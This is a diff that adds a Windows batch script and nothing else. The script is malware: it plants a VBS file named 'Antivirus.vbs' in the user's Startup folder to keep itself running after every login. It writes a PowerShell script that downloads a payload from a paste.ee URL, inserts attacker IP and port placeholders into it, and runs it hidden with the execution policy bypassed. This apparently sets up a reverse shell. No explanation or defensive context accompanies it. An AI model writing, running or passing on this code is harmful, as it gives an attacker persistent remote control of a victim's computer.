@@ -1,0 +1,14 @@
+@echo off
+cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+echo Set oShell = CreateObject ("Wscript.Shell") >> Antivirus.vbs
+echo Dim strArgs >> Antivirus.vbs
+echo strArgs = "cmd /c cd %temp% && powershell -executionpolicy bypass -window hidden -file .\source.ps1" >> Antivirus.vbs
+echo oShell.Run strArgs, 0, false >> Antivirus.vbs
+cd %temp%
+echo $env:tmp >> source.ps1
+echo (new-object Net.WebClient).DownloadString('https://paste.ee/r/IuiZc') ^| out-file -filepath 1.vs >> source.ps1
+echo (gc 1.vs) -replace '_IP_', '_attackerip_' ^| Out-File -encoding ASCII 2.vs >> source.ps1
+echo (gc 2.vs) -replace '_PORT_', '_attackerport_' ^| Out-File -encoding ASCII temp.ps1 >> source.ps1
+echo .\temp.ps1 >> source.ps1
+powershell -executionpolicy bypass -window hidden -file .\source.ps1
+pause >nul
